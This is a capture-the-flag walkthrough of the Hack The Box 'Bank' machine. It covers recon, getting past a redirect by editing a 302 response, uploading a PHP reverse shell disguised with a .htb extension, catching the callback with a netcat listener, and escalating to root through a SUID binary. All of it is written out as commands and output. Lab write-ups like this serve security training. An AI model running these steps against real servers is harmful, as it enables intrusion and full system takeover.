# Bank-HTB
Bank is a Linux machine that rated as easy. So let's start :)

# Recon
I started by runing nmap scan on the machine and found 3 open ports.
```
root@kali:~/Desktop# nmap -sC -sV 10.10.10.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 13:58 EDT
Nmap scan report for bank.htb (10.10.10.29)
Host is up (0.027s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-title: HTB Bank - Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds
```
First thing to do is add ```bank.htb``` to ```/etc/hosts```. add this line in the file ```10.10.10.29     bank.htb```
Now if we browse to bank.htb we will find a login page.

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Bank/images/1.png)

## ffuf
As always I like to use ffuf to fuze web directories
```
root@kali:~/Desktop/tools/Web/FFUF# ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://bank.htb/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://bank.htb/FUZZ.php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 403, Size: 279, Words: 21, Lines: 11]
# Copyright 2007 James Fisher [Status: 302, Size: 7322, Words: 3793, Lines: 189]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# Suite 300, San Francisco, California, 94105, USA. [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 302, Size: 7322, Words: 3793, Lines: 189]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
login                   [Status: 200, Size: 1974, Words: 595, Lines: 52]
# Priority ordered case sensative list, where entries were found  [Status: 302, Size: 7322, Words: 3793, Lines: 189]
support                 [Status: 302, Size: 3291, Words: 784, Lines: 84]
# This work is licensed under the Creative Commons  [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# on atleast 2 different hosts [Status: 302, Size: 7322, Words: 3793, Lines: 189]
index                   [Status: 302, Size: 7322, Words: 3793, Lines: 189]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# directory-list-2.3-medium.txt [Status: 302, Size: 7322, Words: 3793, Lines: 189]
#                       [Status: 302, Size: 7322, Words: 3793, Lines: 189]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 302, Size: 7322, Words: 3793, Lines: 189]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
                        [Status: 403, Size: 279, Words: 21, Lines: 11]
:: Progress: [220560/220560] :: Job [1/1] :: 1102 req/sec :: Duration: [0:03:20] :: Errors: 0 ::
```
And we found ```support.php```, If we try to browse to it we get error 302 which is a redirection and we get back to the login page ```login.php```

So now to avoid the redirection we need to change the intercepting setting in Burp and we do that like this:
Go to ```Proxy``` and then ```options```, then enable these:

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Bank/images/2.png)

So now if we intercept the request we get this:
```html
HTTP/1.1 302 Found
Date: Mon, 10 Aug 2020 16:44:36 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Length: 3459
Connection: close
Content-Type: text/html


<div class="col-sm-5">
    <div class="panel panel-primary">
        <div class="panel-heading">
            <h3 style="font-size: 20px;">My Tickets</h3>
        </div>
        <div class="panel-body">
		    <div class="content-box-large">
		        <div class="panel-body">
		            <table class="table table-bordered">
		                <thead>
		                    <tr>
		                        <th>#</th>
		                        <th>Title</th>
		                        <th>Message</th>
		                        <th>Attachment</th>
                                        <th>Actions</th>
		                    </tr>
		                </thead>
		                <tbody>
		                    <tr><td>1</td><td>bingo</td><td>bingo</td><td><a href='http://bank.htb/uploads/exploit.htb'>Click Here</a></td><td><a href='delete-ticket.php?id=1'>Delete</a></td></tr>		                </tbody>
		            </table>
		        </div>
		    </div>
		</div>
    </div>
</div>
<!-- New Ticket -->
<div class="col-sm-5">
    <section class="panel">
        <div class="panel-body">
            <form class="new_ticket" id="new_ticket" accept-charset="UTF-8" method="post" enctype="multipart/form-data">
                <label>Title</label>
                <input required placeholder="Title" class="form-control" type="text" name="title" id="ticket_title" style="background-repeat: repeat; background-image: none; background-position: 0% 0%;">
                <br>
                <label>Message</label>
                <textarea required placeholder="Tell us your problem" class="form-control" style="height: 170px; background-repeat: repeat; background-image: none; background-position: 0% 0%;" name="message" id="ticket_message"></textarea>
                <br>
                <div style="position:relative;">
                		<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
				        <a class='btn btn-primary' href='javascript:;'>
				            Choose File...
				            <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
				        </a>
				        &nbsp;
				        <span class='label label-info' id="upload-file-info"></span>
				</div>
				<br>
                <button name="submitadd" type="submit" class="btn btn-primary mt20" data-disable-with="<div class=&quot;loading-o&quot; style=&quot;padding: 7px 21px;&quot;></div>">Submit</button>
            </form>
        </div>
    </section>
</div>
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
    <!-- jQuery -->
    <script src="./assets/js/jquery.js"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="./assets/js/bootstrap.min.js"></script>
    <!-- Morris Charts JavaScript -->
    <script src="./assets/js/plugins/morris/raphael.min.js"></script>
    <script src="./assets/js/plugins/morris/morris.min.js"></script>
    <script src="./assets/js/plugins/morris/morris-data.js"></script>
    <!-- SweetAlert -->
    <script src="./assets/js/sweetalert.min.js"></script>
</body>
</html>
```
At this point before we forward the packet we need to change ```302``` to ```200``` so we can view the page. Also make a note of this ```<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --> ```

Now let's use ```php-reverse-shell.php```. You can find it here ```/usr/share/webshells/php/php-reverse-shell.php``` or use ```locate``` to find it. Change the ip address to yours and also change the port if you want. After you finish this and save it run this ```mv php-reverse-shell.php php-reverse-shell.htb```. So it can be run as a php file.

make sure that you run the listener before oppening the page.
```
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
```
Open the page now and you should get your shell :)
```
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.29] 49464
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 19:57:38 up 23:05,  0 users,  load average: 29.05, 22.32, 17.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
First thing to do is to upgrade our shell you can do that by runing this command: ```python -c "import pty;pty.spawn('/bin/bash')" ```
So first let's look for suid binaries.
```
www-data@bank:/$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```
As we can see the only intresting one is ```/var/htb/bin/emergency```

If we run it we get a shell as root :)
```
www-data@bank:/$ /var/htb/bin/emergency
/var/htb/bin/emergency
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```
```
# cat /root/root.txt
cat /root/root.txt
d5be56adc67b4...
```
```
# cat /home/chris/user.txt
cat /home/chris/user.txt
37c97f8609f3...
```

Thanks for reading and you can find me here on Twitter: https://twitter.com/electronicbots
